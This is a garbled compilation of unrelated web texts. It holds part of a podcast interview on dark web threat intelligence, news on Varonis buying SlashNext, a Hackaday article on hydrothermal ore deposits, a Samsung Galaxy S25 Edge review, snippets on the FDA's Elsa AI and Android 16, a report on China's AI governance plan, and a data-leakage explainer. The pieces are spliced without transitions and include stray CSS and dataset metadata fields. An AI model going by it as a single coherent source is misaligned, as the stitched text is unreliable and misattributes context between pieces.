data if I agree with those, and I can identify the so-called hallucinations, I can tell you the junk the system has pumped out. But at the same time, for every piece of junk that one of these systems pumps out, it's also pumping out a valuable insight.It's something that maybe you haven't considered before or a piece of data that you neglected to fully hunt down. It's the force magnifier. It's another tool in the toolbox for folks who are going through a tremendous amount of data to be able to make sense of it in a scalable way.Alexander CulafiI don't want to make it sound like a job interview where I'm like, think of a time when this happened, but could you tell me an example just so I have a better idea of how, what kind of data you would take in here and then how you would act upon it. I think the Dark Web's a great sort of microcosm to drill in on here.Keith JarvisRight. Yeah, so what we're looking for is person names. We're looking for any sort of technical artifacts that they may post, like a Tox ID or another account. We're talking about Onion addresses for leak sites or for other types of marketplaces. We're looking at the reputation that they have on these forums. Most forums have a way to say this person has a high reputation. They have money in escrow, which means they're not just a cutout account. They may have reviews from other vendors or other customers on the site, their longevity on the site. And again, that sort of network analysis that our colleagues perform there to say who's connected to who. You take all that data, and you can sort of build up a picture of who's doing what.That's been the key focus of our groups is on the attribution level is to say, We can attribute this cluster of activity of malware to this group. Now let's go match that up with what we're seeing on real networks, real network traffic, real endpoint data and say this is what they're actually attacking. These are the verticals or geographies that they're actually attacking. So that's been a big focus point for us is to be able to match up what we're seeing on the Dark Web versus what we're actually seeing in actual victim networks.Alexander CulafiI would imagine that this kind of technology would be very helpful for the Bitcoin-tracking component of it, where if you plug in an address, I wouldn't be surprised if just the way Bitcoin works, if that wouldn't just save a ton of time.Keith JarvisYeah, well, I think the benefit of the Bitcoin and other cryptocurrency blockchains is it's a rather, you know, verbose record of what's happened. You don't even really have to go in there and draw unique insights. You can see if you suspect a transaction happens, you can go verify that it did and then what amount and what time and who verified it and where it came from. I think that the key to being successful in those sorts of investigations is having data, the attribution data upfront is to say, OK, we have a busy incident response practice and we've done a hundred ransomware cases this quarter. And we know the wallets that are associated with these threat groups or where the victims pay. And that's otherwise non-public information that wouldn't be known to anyone but the threat actors and the victim. And having that sort of attribution, that tagging, that's when you can really start to build up those relationship networks and say, I understand that this is going into a coin mixing service, but the output addresses are going to a certain ransomware group or another threat group. And I guess you could use AI. I haven't done this, but you could use AI to, go through, which is a lot of data, and then draw up those insights for you. But for the most part, it's a pretty straightforward investigation.Alexander CulafiAs we wrap up a little bit, I wanted to think a little bit about the security customer, the defender, where if I'm someone looking to buy a security product and I'm going to 15 vendor sites, I know this probably used to be a lot more common than it is now, but you would see things that are like Dark Web monitoring, we track the Dark Web. Sometimes as a slight scare tactic, sometimes as shorthand for a lot of more complicated stuff. And then there's obviously real data and infrastructure that does exist on hidden services. But as a defender, what should I know about the Dark Web? What should I worry about? And what's the context I should think about it in so that I'm thinking about it less is like a marketing term and more as something I can consider appropriately?Keith JarvisRight, yeah, and certainly it is a marketing term in many regards. And I don't want to oversell this as a security company that does Dark Web monitoring, right? But I think you have to ask yourself, what is it that you as an organization think might be out there that you are worried about? Is it because of a breach? Is it just because of general security posture that you want to know what's out there? And have an idea of if you were to get Dark Web monitoring, what are you hoping to find or to not find and how does that improve your security posture?And I think the ideal solution for the overwhelming number of customers is to have at least one security vendor in your stable of other security vendors that has some sort of capability where you can go and ask those questions, even if it's not like a Dark Web monitoring SKU that's on your contract, but at least you have some subject matter experts in one of your vendors that you can say, Look, we had a breach. We're interested to see if any of our credentials or any of our data has popped up on any of these leak sites, any of these forums and stuff like that. Have somebody you can go to. But if you do identify things that you want constant measurement of, if you have credentials, if you want a weekly report, if you have credentials out there, then yeah, it's probably time to contract with an actual monitoring firm to get that data.But for most people, it's going to be the sort of one-off question or periodic evaluation, but not like a regular evaluation. And one thing I would caution people to maybe not do, because I'll find out exactly how hard it is, is to try to build that capability internally. Like by all means, if you want to go set up an account on a direct web forum, have at it. But if you think you're really going to be able to build those insights internally, I think you'll find out just how difficult it is to really get useful intelligence out of that without a really well-structured program. But I also don't want to dissuade anyone from pursuing that if they want to.Alexander CulafiYou make a really good point there too, in that maybe folks will sell it, you know, as a SKU, as a separate billable thing or whatever, that they're doing Dark Web monitoring. But I imagine that if someone's looking into a major security vendor, not to speak for all of them, but if you're looking into a major security vendor that's offering some kind of threat monitoring or what have you, whether it's called Dark Web monitoring or not, stolen credentials are probably going to be part of the package regardless. Would it be fair to say that orgs should maybe think less in terms of ""Is it on the Dark Web?"" and think more in terms of, are you looking for stolen credentials? Are you looking for all this other data that would be relevant for me? Which is inevitably going to be on the Dark Web, but it's not really the point.Keith JarvisYeah, I think at this point it's kind of table stakes for a mature threat intelligence company to have that capability internally and bake that into services that you're providing, the intelligence that you're providing to your customers. Like if one of your major security vendors doesn't have that capability, that's a big question mark because we've got three, four people working full time just on Dark Web monitoring and I'm not even one of them, but it's not really a service that we sell to any great degree. It's just because we need to have that context, that intelligence to build out our picture of the threat landscape, but also to see what's happening, what's new, to make sure those detections and protections get into the product and get communicated to our customers. So it's not even really a revenue-generating service line. It's just something we feel is necessary to do to be competent at what we're trying to achieve here.Alexander CulafiExcellent. And with that, I would say that was a great conversation. Thank you very much, Keith. I really appreciate this tour through how you're looking at the Dark Web, how law enforcement's looking at the Dark Web, and how things have changed a little bit over time.Keith JarvisYeah, thank you so much.

The combination of two companies will provide customers with defenses for phishing and attacks generated by artificial intelligence (AI) sent over email, SMS, and chat messaging services, such as Slack, Teams, Zoom, and WhatsApp. ""The combination of SlashNext's multi-channel phishing defense and Varonis' end-to-end approach to data security — including AI security and identity protection — gives customers the platform they need to detect early signs of compromise and stop attacks long before data is impacted,"" wrote Varonis CEO and co-founder Yaki Faitelson in a blog post announcing the acquisition. SlashNext deploys predictive AI models and technologies such as computer vision, natural language processing, and virtual browsers to identify, remove, and block phishing and social engineering attacks across email and collaboration platforms. In a statement, Varonis cited statistics from The Tolly Group, an independent testing firm for cybersecurity tools, indicating that SlashNext had a 99% overall detection accuracy and a 100% detection rate for business email compromise (BEC) and QR code attacks. ""We put a protective bubble using what we call generative-driven AI around the user, so anywhere that user can be messaged, we're going to protect them,"" said SlashNext CEO Patrick Harr during a video interview with Dark Reading at RSAC Conference in 2023. Related:Microsoft Lays Out Its Quantum-Safe PlansWhile several established security companies also offer BEC protection — such as Abnormal Security, Mimecast, and Proofpoint — Varonis CFO and COO Guy Melamed says SlashNext is a more reliable offering. ""We looked at the accuracy rates, and SlashNext is really, really high in comparison to some of the existing companies that are already out there,"" he maintains. ""We've checked this technology and found it to be best-in-class. We wouldn't have done the acquisition otherwise, and this is a market that can be sold in combination with the Varonis platform in the very near future.""According to Melamed, the BEC protection capabilities will be integrated into Varonis's platform during the fourth quarter of this year. ""It's a mature technology,"" he says.Prior to this acquisition, Varonis had already added basic email monitoring capabilities to its data security posture management (DSPM) offering, introduced early last year to provide customers with unified data classification, access governance, and threat detection in hybrid environments. The platform's email monitoring capabilities included discovery and classification of sensitive message content, tracking access and permission updates, and issuing alerts when it discovers unusual actions, such as unsanctioned forwarding and policy violations.Related:Researchers Warn of 'Hidden Risks' in Passwordless Account RecoveryThe SlashNext acquisition is Varonis's second transaction this year. In March, Varonis acquired database activity monitoring (DAM) provider Cyral in a deal valued at approximately $25 million. The Cyral acquisition facilitated last week's release of Varonis Next-Gen DAM, which is now available with the Varonis Data Security Platform. Varonis Next-Gen DAM is designed to protect databases from queries generated from bots and malicious AI-based agents.""The [Cyral] acquisition gave us the ability to protect additional platforms that we haven't covered before,"" Melamed says. Varonis aims further to widen its messaging protection capabilities with the SlashNext deal.The cash and stock deal is valued at up to $150 million, depending on how many SlashNext employees Varonis retains. Most of the 100 employees work in the United Kingdom. In a LinkedIn post on Tuesday, Harr indicated that he will not be joining Varonis and is transitioning out of the CEO role he has held since 2020.Related:SentinelOne Acquires AI Startup Prompt SecurityAbout the AuthorJeffrey SchwartzContributing WriterJeffrey Schwartz is a journalist who has covered information security and all forms of business and enterprise IT, including client computing, data center and cloud infrastructure, and application development for more than 30 years.

In the last edition of this series, we learned what counts as ore (anything that can be economically mined) and talked about the ways magma can form ore bodies. The so-called magmatic processes are responsible for only a minority of the mines working today. Much more important, from an economic point of view, are the so-called “hydrothermal” processes.
Come back in a few million years, and Yellowstone will be a great mining province.Image: “Gyser Yellowstone” by amanderson2, CC BY 2.0
When you hear the word “hydrothermal” you probably think of hot water; in the context of geology, that might conjure images of Yellowstone and regions like it : Old Faithful geysers and steaming hot springs. Those hot springs might have a role to play in certain processes, but most of the time when a geologist talks about a “hydrothermal fluid” it’s a lot hotter than that.
Is there a point on the phase diagram that we stop calling it water? We’re edging into supercritical fluid territory, here. The fluids in question can be hundreds of degrees centigrade, and can carry things like silica (SiO2) and a metal more famous for not dissolving: gold. Perhaps that’s why we prefer to talk about a “fluid” instead of “water”. It certainly would not behave like water on surface; on the surface it would be superheated steam. Pressure is a wonderful thing.
Let’s return to where we left off last time, into a magma chamber deep underground. Magma isn’t just molten rock– it also contains small amounts of dissolved gasses, like CO2 and H2O. If magma cools quickly, the water gets trapped inside the matrix of the new rock, or even inside the crystal structure of certain minerals. If it cools slowly, however? You can get a hydrothermal fluid within the magma chamber.

Peg It as a Pegmatite
This can create what’s called a pegmatite deposit. Strictly speaking, “pegmatite” refers to rock with a specific texture; when we’re talking about ore, we’re almost always referring to granitic pegmatites: that is, granite rocks with this texture. That texture is big crystals: centimeter size or bigger. Crystals grow large in a pegmatite deposits in part because of the slow cooling, but in part because of the action of the hydrothermal fluid that is squeezed out of the slowly-cooling rock.
When you’re using your hammer for scale next to the crystals, you know it’s a pegmatite. This example is from Radium Creek, Arkaroola, South Australia. Image: Geomartin, CC-BY-SA 4.0
Again, we’re talking about a fluid that’s hundreds of degrees Celsius: seriously supercritical stuff. It can carry a lot of ions. Circulating through the magma chamber, this ion-rich fluid brings each crystal all the metal ions it needs to grow to its full potential. Maybe that’s a garnet the size of your fist, or feldspar crystals like pink playing cards. The ions in the fluid can be leftovers from the earlier melt, but may also include material scoured from surrounding rocks.
Aside from the spectacular granite counter tops and semiprecious gems that sometimes come out of these deposits, granitic pegmatites come in two types: lithium-rich and rare-earth element rich. The lithium rich pegmatites are often called LCT deposits, the letters standing for Lithium, Cesium and Tantalum, the metals of interest. Those–especially the first and last–are not exactly metals of low consequence in this electronic era. That goes double for the rare-earth elements. Especially in North America, there’s a great deal of active prospecting searching for these increasingly valuable deposits.
Mica capacitors. You can’t make these guys without mica, and granitic pegmatites are a good source.Image: Mataresephotos, CC-BY-3.0
Mines have been sunk to extract boron, fluorine, tin, and uranium from pegmatite deposits as well. Of particular note to Hackaday readers would be the mineral Muscovite, a course-grained mica often found in pegmatites, among other locales. Muscovite mica has excellent dielectric properties and fractures easily into thin sheets, making it very useful in capacitors and high voltage applications. The high thermal stability and voltage tolerance of mica capacitors makes them invaluable even today in niche applications, even though ceramics have taken over most of their original uses.
One thing to note about these deposits is that they are not necessarily going to be restricted to Earth. Don’t let the “hydro” in “hydrothermal” fool you– this process is occurring deep underground, in a magma chamber with no access to any surface water. The H2O involved is coming up from the mantle, and the mantle of every rocky body does contain trace water. That even holds true for the Earth’s moon; while older sources will declare that no hydrothermal processes are possible there, newer work has led to a reevaluation of how “wet” lunar rock really is, and re-opened the possibility of lunar pegmatites. Given that, there’s no reason not to expect the process to be at work on every rocky body in the solar system. Look for granitic rock, and you might find an interesting pegmatite.
Orogenic Ores
If the hydrothermal fluid stays put in a magma chamber, it can create pegmatite deposits, but if it breaks free, you’ll find something completely different. Running through faults, fissures, and cracks in the surrounding rock, the somewhat-lower-temperature fluid will have a different mineral content depending both on the melt and the host rock. These hydrothermal vein deposits are sometimes called orogenic ore deposits, because they are often associated with mountain building, which geologists call orogeny.
The white quartz vein follows the fissures in the rock hydrothermal fluid once flowed through. “Main Vein (hydrothermal quartz-gold vein), subsurface exposure in Nalunaq Gold Mine, southern Greenland” by James St. John, CC BY 2.0
That doesn’t mean you need to look near mountains: the gold fields of Kirkland Lake, mentioned last time, are actually an orogenic deposit, and Kirkland Lake sits near the middle of the Canadian Shield, as far from any (modern) mountains as you are likely to find. There may have been mountains there, once, but they were eroded away by the time the Dinosaurs walked the Earth. What you will find there are shocking white veins of quartz shooting through the granite of the Canadian Shield– evidence of the hydrothermal fluid’s ability to carry dissolved silica through fissures of the rock– interspersed with flecks and pebbles of gold. Most gold started in hydrothermal deposits like this one, but in an ironic twist, most of the gold humans have mined is actually from a different type of deposit we’ll get to later. For now we’ll say there are secondary processes at work on this planet and leave it at that.
Native Silver, from a mine that closed in 1887. Image: “Native silver in hydrothermal vein rock (Proterozoic; Silver Islet Mine, Lake Superior, Ontario, Canada) 1” by James St. John, CC BY 2.0
Gold isn’t the only thing to be found in these hydrothermal veins: native silver and copper mines have also been found chasing quartz veins. Cobalt, Molybdenum, even Tin and Tungsten may be found, though not necessarily in native form. To a geologist, note that the word “native” has nothing to do with tribal affiliation, and everything to do with elemental composition. “Native” metals are just that: metals. Native copper is a lump of Cu, not chemically bound into any mineral.
As you might imagine, native metals are among the most desirable of ores, as they often require very little by way of refining. For that reason, until perhaps Greenland or Antarctica’s melting glaciers expose new lands to prospecting, you’re not likely to ever see a new mine producing native copper.
The redox conditions of the fluid are hugely important here: as you might imagine, native metals aren’t going to precipitate from an oxidizing fluid. Redox reactions are hard enough in chemistry class, though; bring them into the world of geochemistry and it gets hugely complicated. Nature is a messy system with too many variables to easily predict.
That’s something many a prospector has found out to his chagrin, for not every vein of quartz will bear metals. On the other hand, enough quartz veins do that “look for veins of quartz” was common advice for prospectors once upon a time. Not all metal-bearing veins may not be entirely quartz, either; many contain quite a lot of carbonate minerals like calcite. The hydrothermal fluid may start out with different amounts of metals dissolved within it, depending on the source magma; it may also scour more or different minerals from the host rocks it flows through. Veins may go on for miles of nothing but quartz before something in composition of the rock, or its temperature, or the pH causes the fluid to start depositing valuable minerals. Geology can be a crapshoot like that.
Of Course It’s More Complex
The above description is somewhat misleading as it makes it sound like vein deposits can only be produced from hydrothermal fluid coming from magma, but that is untrue. It is also possible that surface water (called “meteoric” water by geologists who want to confuse you into thinking about space rocks) can trickle down through fractured rocks until it
Meteoric water has nothing to do with this.Image: Navicore, CC-BY-3.0
reaches a hot-zone and picks up elements by dissolving minerals. A mix of meteoric and “crustal” water (that is, water from magma) may be present in a balance that changes over time. It should also be noted that this water can form a convective circuit, down to the hot zone (or melt) to pick up new minerals, then circulate upwards to deposit them in colder rock. Because this circulating fluid is cooler than in the case of fluids coming directly from a melt (“only” three or four hundred degrees Celsius) , they are sometimes called “epithermal” fluids, and the resulting veiny deposits can be called “epithermal” deposits. Those temperatures are not too far off from what you might find in geyser country. While I’m not suggesting anyone go digging under Old Faithful right now, it might be an interesting locality in a few million years or so.
Epithermal/orogenic/quartz vein deposits don’t need meteoric water– crustal water can be enough–but I have seen no references suggesting they might be found on the Moon. Mars, on the other hand, seems to have every condition required, so there may well be gold in them thar’ Arean hills. Meteorites believed to have come from Vesta show evidence of quartz veinlets as well, so don’t count out larger planetoids when talking about hydrothermal processes either.
There are other high-temperature hydrothermal deposits other than granitic pegmatites we haven’t yet gotten into; there are also several lower-temperature types that are likely to be exclusive to Earth. This entry in our series is getting long enough, however, so we will return to the theme of hydrothermal ore deposits another day.",https://hackaday.com/2025/09/08/ore-formation-processes-part-two-hydrothermal-boogaloo/,Unknown,2025-09-08 00:00:00,"The article discusses the various geological processes involved in forming ore deposits, particularly focusing on hydrothermal processes and pegmatite deposits.

Samsung Galaxy S25 Edge review: More than just super thinIt's basically an S25+ with the titanium frame and main cam from the Ultra, but even thinner.Sam RutherfordSenior Writer, ReviewsSam RutherfordSenior Writer, ReviewsFri, May 23, 2025 at 6:00 PM UTCThe Samsung Galaxy S25 Edge.(Sam Rutherford for Engadget)When I first heard Samsung was bringing back the Edge name as a new super-thin member of the S25 family, all I could think was: Why? Honestly, I thought phone makers had gotten over their hunger for thinness nearly a decade ago. The quest to shave millimeters off devices resulted in worse battery life, extra heat and more limited features. So what gives?On a certain level, just like fashion, older trends can over time become fresh and stylish again. Additionally, after phones made the transition to 5G — which required extra power, more complex modems and larger antennas — modern components have started shrinking again, essentially paving the way for the return of slimmer handsets. But then it hit me. While thinness may be the most striking thing about the Galaxy S25 Edge, that's not enough to justify the creation of a whole new device. Instead, I believe this phone is a part of a larger mission by Samsung to make the middle child of its flagship mobile lineup a more appealing member of the family. And when viewed in that light, I actually think it's largely a success.DesignBilly Steele for Engadget83100Expert ScoreA more stylish (and thinner) version of the S25+Samsung Galaxy S25 EdgeWhile it suffers from a smaller battery and no telephoto lens, the S25 Edge is more than just a super sleek phone designed purely for extreme thinness. ProsSleek designTitanium frameBig 200MP main camBright OLED displayConsSmallest battery on any S25 phoneNo telephoto lensMediocre wired charging speedNot fully Qi2 compatible$1,100 at SamsungNow don't get me wrong, despite my gripes about how thinner phones are less practical, the S25 Edge is beautifully designed. At just 5.8mm thick (0.23 inches), it feels impossibly sleek. What might be even more impressive is that Samsung hasn't sacrificed durability to get here either. Just like the S25 Ultra, the Edge features a titanium frame, an IP68 rating for dust and water resistance and an even stronger Gorilla Glass Ceramic 2 panel covering its display. The one difference is that the Edge's screen has a glossy finish instead of matte like on the Ultra because — and I kid you not — Samsung says an anti-reflective coating would have increased its thickness. Kudos to sticking to a strict design philosophy, because in terms of sheer feel and aesthetics, S25 Edge is undeniably enchanting.Sam Rutherford for EngadgetHowever, while the S25 Edge shares some characteristics with the Ultra, like its frame and main camera, at least when it comes to its overall size, it's really more of a refreshed take on the S25+. It has the same 6.7-inch OLED panel with a 120Hz refresh rate that's just as vibrant and wonderfully colorful as before. Although it does weigh a bit less at 163 grams or 5.75 ounces versus the S25+ (190g or 6.7 oz).PerformanceLike the rest of the S25 family, the Edge is powered by a Snapdragon 8 Elite for Galaxy chip with 12GB of RAM and either 256GB or 512GB of storage. Despite the compact dimensions, Samsung still found room to squeeze a vapor chamber inside to prevent throttling and overheating. So even when pushed, the back of the phone rarely got more than lukewarm while delivering strong performance as I was gaming, multitasking or doing pretty much anything else you can think of.CamerasSam Rutherford for EngadgetThe other major departure from the S25+'s basic template is that the Edge features the 200MP main sensor from the Ultra, along with a 12MP ultra-wide cam. But there's no dedicated zoom. Now at first, I was a bit upset because I think any phone this expensive should have a telephoto lens. That said, the massive amount of pixels the Edge's primary sensor can capture means you have quite a bit of freedom to crop in without degrading image quality. You just need to remember to tell the camera to shoot in full 200MP mode instead of the standard 12MP setting. One other small change is that Edge features a slightly wider-angle 12MP selfie cam than the S25+ and Ultra, which allows you to fit more people in group shots, but that's really the main difference.AdvertisementAdvertisement#_R_5pa9qtialuknpfilbH1_ { display: none; }

      }In general use, the S25 Edge takes great pics. Colors are rich and details are crisp, though you still get Samsung's slightly oversaturated hues and warmer tones. The same goes for low-light shots. For this review, instead of comparing it to a Pixel or iPhone, I pitted the Edge against the Motorola Razr Ultra. I feel like both are attempting to woo people who want a sleek and stylish device, but they are doing it in very different ways.In a shot of some roses, the Razr Ultra struggled with focus and color saturation.
In a surprise, the Moto Razr Ultra's photo has an even warmer white balance than the S25 Edge.
In bright light, the two phones are close, though the S25 Edge features slightly better sharpness and details.
In low light, the S25 Edge shot a pic that was more well-exposed and sharper.
In a nighttime cityscape, the S25 Edge wins out due to slightly more vibrant colors.
Both phones go overboard sharpening the leaves on the tree. But the S25 Edge's pic still captured more details.
1 / 6Samsung Galaxy S25 Edge vs Moto Razr Ultra camera comparisonsIn a shot of some roses, the Razr Ultra struggled with focus and color saturation.
What immediately jumped out is that foldable phones (at least the Razr) still lag behind more traditional glass bricks, even ones as thin as the Edge. In nearly every shot, Samsung's handset produced brighter, sharper and better-exposed images than Motorola's. So if you're the kind of person who wants a compact phone without needing to sacrifice image quality, the S25 Edge is a stronger pick.Battery lifeThe biggest trade-off when making a phone this skinny is having less room for its battery. As such, the S25 Edge has the smallest power pack in the family at 3,900 mAh, which is 100mAh less than what’s in a base S25. This led to a time of just 25 hours and 59 minutes on our local video rundown test. That's not terrible, but it is three and a half hours less than what we got from the S25 Ultra (29:27) and two hours worse than a standard S25. For those who care a lot about longevity, you have been warned.Sam Rutherford for EngadgetThankfully, the S25 Edge still has support for wireless charging at an acceptable 15 watts, though its wired speeds are just average at 25 watts. However, as the phone is merely ""Qi2 ready,"" anyone who wants to use compatible magnetic wireless accessories will need to buy a case or an adhesive mount with a built-in magnet, because there isn't one inside the phone itself.Wrap-upThe S25 Edge is a divisive phone. I still don't fully grasp the desire to make modern phones thinner than they already are. Particularly if you're like most folks and you throw the thing in a case as soon as you get it (even when accounting for Samsung's new super slim option). Shaving off an extra 1.5mm over the standard S25 doesn't really make a tangible difference in how you use it, unless you consider the phone's reduced battery life a good thing.Sam Rutherford for EngadgetAdvertisementAdvertisement#_R_75a9qtialuknpfilbH1_ { display: none; }

      }But as an alternative to the humdrum S25+, suddenly things get a lot more interesting. Samsung's previous middle child costs significantly more than a base S25, but it doesn't have the fancy features like a super high-res main camera or a titanium frame like you get on the S25 Ultra. Really, the S25+'s most attractive feature is a nicely-sized 6.7-inch screen.Now here's where the Galaxy S25 Edge comes in. It has all of those things alongside a super thin and wonderfully crafted chassis for the same $1,100 starting price as the S25+. Yes, Samsung sacrificed some battery capacity and the phone's dedicated zoom to get here, but those aren't straight-up dealbreakers. That's because with the Edge, the new in-between member of Samsung's flagship mobile family is more than just skinny — it has a stylish identity that can stand on its own.Advertisement#_R_3e9qtialuknpfilbH1_ { display: none; }

The FDA's head of AI, Jeremy Walsh, acknowledged the problem: ""Elsa is no different from lots of [large language models] and generative AI. They could potentially hallucinate.""
Despite these risks, Elsa is already being used to review clinical protocols and assess risks during inspections. The system operates in a regulatory gray area, since there are currently no binding rules for AI in US healthcare.Ad

        iframe { max-width: 100vw; }
      }Google believes these changes make Android and apps easier to understand, while making them more appealing to young people. Based on the screenshots and clips Google shared, using Material 3 Expressive on Android 16 and Wear OS 6 has made the OSes look bouncier, more playful and fun. On Android, that also comes with the ability to add more tools to Quick Settings and apps and widgets to your home screen app grid. How much of a difference the new design language actually makes in your day-to-day life will depend on how quickly developers adopt the new style.Google says you'll be able to check out the new look yourself when the Android 16 beta becomes available on select Android devices in June.Gemini is coming to even more placesGoogleGoogle made Gemini the default assistant on Android and offered the multimodal generative AI's smarts on the web and iOS. Now the assistant is making the jump to even more of the surfaces Google already controls, including Wear OS, the wearable operating system used by Samsung’s Galaxy Watches and Google’s Pixel Watches, Google TV and Android Auto.Gemini will be able to do all of the things Google Assistant could do, like setting timers or creating reminders, but with much more flexible, natural language interactions. In Android Auto and cars with Google Built-in, you’ll also be able to use Gemini Live, Google’s tool for having live conversations with the AI about whatever topic you choose.AdvertisementAdvertisement#_R_n7b6tialuknpfilbH1_ { display: none; }

      }Google TV will leverage Gemini for TV and movie recommendations across your favorite genres, along with the AI assistant's basic ability to answer questions. You could, for example, ask it for recommendations for kid shows and get information about your favorite actor. Gemini will also be available on Google's new Android XR platform, but Google suggested that more information about its mixed-reality plans are being saved for I/O on May 20.Android is getting new security features and the Find HubGoogleA major component of each new version of Android is improved security features, and Google has a few new features planned for Android 16. The company says it's expanding its AI model for detecting spam texts and calls to account for new types of scams, like road toll scams.The next version of Android will also make it possible to grant accessibility privileges on a call with an unknown contact, and a new Key Verifier tool makes it possible to swap encryption keys to verify the person you're talking to is who they say they are.On top of those changes, Google is expanding its Find My Device network into the new Find Hub, which can track your Android devices, compatible accessories and trackers, all in one location. The big change in the move from Find My Device to Find Hub is broad support for devices with ultra-wideband radios, which offer more precise tracking. Devices in Find Hub will also be able to use your phone's satellite connectivity to make themselves findable even when you don't have cell service.During its pre-taped Android Show stream on May 13, Google announced its latest Material 3 Expressive design language, the expansion of Gemini AI to Wear OS and Android Auto and enhanced security features for its mobile operating system. The search giant will be following up with more AI announcements at its Google I/O 2025 developer conference, which runs from May 20 to May 23. Advertisement#_R_3j6tialuknpfilbH1_ { display: none; }

            China has proposed a global action plan to govern artificial intelligence, just days after the United States unveiled its own plan to promote US dominance of the rapidly growing field that’s become a key bargaining chip in trade talks between the economic powerhouses.
    

    
            Chinese Premier Li Qiang unveiled China’s vision for future AI oversight at the World AI Conference (WAIC), an annual gathering in Shanghai of tech titans from more than 40 countries.

            “Overall, global AI governance is still fragmented. Countries have great differences, particularly in terms of areas such as regulatory concepts, institutional rules,” said Li in his speech on Saturday. “We should strengthen coordination to form a global AI governance framework that has broad consensus as soon as possible.”
    

    
            Li’s remarks came just days after the Trump administration unveiled its 28-page AI action plan, which aims to remove “bureaucratic red tape” and establish US dominance in the sector.
    

    
            While Li did not directly refer to the US in his speech, he alluded to the ongoing trade tensions between the two superpowers, which include American restrictions on advanced semiconductor exports — a component vital for powering and training AI, which is currently causing a shortage in China.
    

    
            “Key resources and capabilities are concentrated in a few countries and a few enterprises,” said Li in his speech on Saturday. “If we engage in technological monopoly, controls and restrictions, AI will become an exclusive game for a small number of countries and enterprises.”

            AI chips have become a key bargaining tool between US and China in trade negotiations, which continued this week with a meeting in Stockholm. Before the latest round of talks, both countries appeared to make concessions, with Washington lifting its ban on sales of a key Nvidia AI chip to China, and Beijing suspending its antitrust investigation into American chemical firm DuPont.
    

    
            Speaking from Scotland on Sunday, Trump said the US is “very close to a deal with China,” but offered no further details. The current deadline for a deal expires on August 12.
    

  
        Billions spent in global AI race


    
            China has not been shy about promoting its AI ambitions: with more than 5,000 AI companies, and a core AI industry valued at 600 billion yuan ($84 billion) in April 2025, the nation is all-in on its tech rivalry with the US.
    

    
            This surge is being fueled by enormous government and private sector spending. Between 2013 and 2023, state venture capital firms invested an estimated $209 billion into AI-related businesses, according to research published by the National Bureau of Economic Research, a private think tank based in Massachusetts, and this year alone, public sector spending on AI is expected to top 400 billion yuan ($56 billion).
    

    
            It’s still a fraction of what the US spends — private AI investment in the US reached $109.1 billion in 2024, around 12 times China’s $9.3 billion — but China’s commitment to the AI race is evident in other ways. Since 2017, China has published more patents for generative AI inventions annually than all other countries combined, according to data from the World Intellectual Property Organization.

            All this investment is narrowing the gap between the US and China in the AI race.
    

    
            Earlier this year, the launch of one-year-old Chinese startup DeepSeek’s new AI model R1 caused chaos on Wall Street and demonstrated China’s technical capabilities by quickly outpacing models by Meta and Anthropic. It was allegedly developed for just $5.6 million, a fraction of the cost spent to make other models like ChatGPT (over $100 million) and Gemini (almost $200 million.)
    

    
            More recently, another startup Moonshot’s Kimi K2 model released earlier this month also sent ripples in the AI community for its lower cost and capabilities that outperform some Google and OpenAI’s models.
    

    
            The rapid development of China’s AI market is even predicted to break even within the next few years, delivering a 52% return on investment as early as 2030, according to research from financial services firm Morgan Stanley.
    

    
            Secretary-General of ASEAN, Dr. Kao Kim Hourn, also called for “robust governance” of artificial intelligence to mitigate potential threats, including misinformation, deepfakes, and cybersecurity threats.

            “These developments demand urgent, coordinated action from the international community to ensure AI serves human welfare and social good,” he said in his speech at the conference, adding that AI implementation in ASEAN could further expand the region’s rapidly growing digital economy and “increase the region’s GDP by 10-18%.”
    

    
            Former Google CEO Eric Schmidt reiterated the call for international collaboration, explicitly calling on the US and China to work together.
    

    
            “As the largest and most significant economic entities in the world, the United States and China should collaborate on these issues,” said Schmidt at WAIC. “We have a vested interest to keep the world stable, keep the world not at war, to keep things peaceful, to make sure we have human control of these tools.”
    

    
            Other speakers included computer scientist Geoffrey Hinton, sometimes referred to as “the godfather of AI” and French AI researcher and special envoy Anne Bouverot.

In January 2025, cybersecurity experts at Wiz Research found that Chinese AI specialist DeepSeek had suffered a data leak, putting more than 1 million sensitive log streams at risk. 
According to the Wiz Research team, they identified a publicly accessible ClickHouse database belonging to DeepSeek. This allowed “full control over database operations, including the ability to access internal data”, Wiz Research stated, with more than a million lines of log streams involved, containing chat history, secret keys and more. 
Wiz immediately reported the issue to DeepSeek, which quickly secured the exposure. Still, the incident underscored the danger of data leakage.
Intentional or unintentional?
Data leakage is a broad concept, covering a range of scenarios. As IBM notes, the term in general refers to a scenario where “sensitive information is unintentionally exposed to unauthorized parties”. 
It could be intentional or unintentional. On the intentional side, for instance, hackers could use phishing or social engineering techniques to manipulate an organization’s employees into exposing their personal data. 
There’s even the risk of an insider threats: for instance, a worker with a grudge who seeks to compromise systems, perhaps for financial benefit or as part of some quest for revenge. 
But unintentional leakage is just as big a concern. This could be a case of simple human error: sending an email to the wrong person or providing too much information to a third party for example.
There are a wide range of common vectors – we’ll run through just a few. 
Misconfigured cloud storage
Cloud misconfigurations can be a common cause of data leakage. The Cloud Security Alliance highlights the danger from simple mistakes, like leaving default passwords in place or failing to properly configure access controls.
Endpoint vulnerabilities
Data processed through hardware like unencrypted laptops or stored in devices such as USBs can be a key vulnerability for leakage; it’s important that employees are aware of – and follow – organizational security policies to mitigate this risk.

Emails and messaging
There’s a real danger that data can be intercepted: this could come from a simple error (sending a sensitive attachment to the wrong address) or through a deliberate attack. Robust encryption is essential to ensure it stays in the right hands. 
Shadow IT
Employees often use their own IT as part of their daily working lives (such as external cloud technologies), including for data storage. While this isn’t generally malicious, it can make risk management more difficult, notes the UK’s National Cyber Security Centre (NCSC), “because you won’t have a full understanding of what you need to protect and what you value most.”
Financial and legal problems
There are several common drivers of data leakage, ranging from weak access controls to a lack of data-classification policies, insufficient monitoring, and inadequate employee training. But no matter the specific cause, the consequences can be devastating. 
For example, regulatory authorities around the world now enforce strict data protection policies, which can result in huge fines for organizations that fail to comply; this includes the EU’s General Daa Protection Regulation (GDPR) and the California Consumer Privacy Act (CCPA).
There is also the broader risk of losing intellectual property (IP) or other sensitive company information. Crimes like credit card fraud could stem from a leak, while public companies could even see a fall in their share price. 
Perhaps most importantly, failing to protect employee and customer data could have a devastating impact on an organization’s reputation, with long-term negative implications for the business. 

Building your defenses 
So how can organizations protect themselves, their employees and their customers from the dangers of data leakage? Here are some key approaches:
Enforce least-privilege access: By granting users access only to the data they need to perform their job, the ‘blast radius’ of a breach or leakage will be significantly reduced.
